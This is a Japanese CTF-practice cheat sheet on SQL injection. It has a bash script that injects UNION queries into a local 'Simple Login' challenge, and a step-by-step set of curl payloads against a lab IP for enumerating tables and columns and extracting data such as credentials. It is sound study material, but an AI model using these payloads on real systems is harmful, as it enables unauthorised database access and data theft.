# SQL injection

- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/#limit-into-method

## shell sciprt

**sql_injection.sh**

```bash
#!/bin/bash
# (Simple Login)[https://alpacahack.com/ctfs/round-2/challenges/simple-login]
URL="http://127.0.0.1:3000/login"
# simple-login には 64 文字以内の制限がある
QUERIES=(
'SELECT @@version,NULL'
'SELECT table_name,NULL FROM information_schema.tables'
'SELECT value,NULL FROM flag'
)
for q in "${QUERIES[@]}"; do
    echo "[+] $q"
    curl -i -X POST \
        --data-urlencode "username=\\" \
        --data-urlencode "password= UNION ${q}-- " \
        $URL 2>/dev/null |
        awk '/^Set-Cookie:/{print $2}' | cut -d'=' -f 2 | sed 's/;//'
    echo
done
```

## 参考 (MySQL)

- https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html
- https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html

## SQLi の手順

1. SQLi が可能か確認

```zsh
curl "http://10.10.10.10/index.php?q='+OR+1--+-"
```

2. バージョンの確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+@@version,NULL--+-"
```

3. 列数の確認

```zsh
curl "http://10.10.10.10/index.php?q='+ORDER+BY+3--+-"
(error)

curl "http://10.10.10.10/index.php?q='+ORDER+BY+2--+-"
(no error)
```

4. 各列の表示位置の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+1,2--+-"
```

5. 表名の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema!='mysql'+AND+table_schema!='information_schema'+AND+table_schema!='performance_schema'+AND+table_schema!='sys'--+-"
```

6. 列名の確認

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='cred'--+-"
```

7. 狙った表から情報を搾取

```zsh
curl "http://10.10.10.10/index.php?q='+UNION+ALL+SELECT+a_col,NULL+FROM+a_table--+-"
```
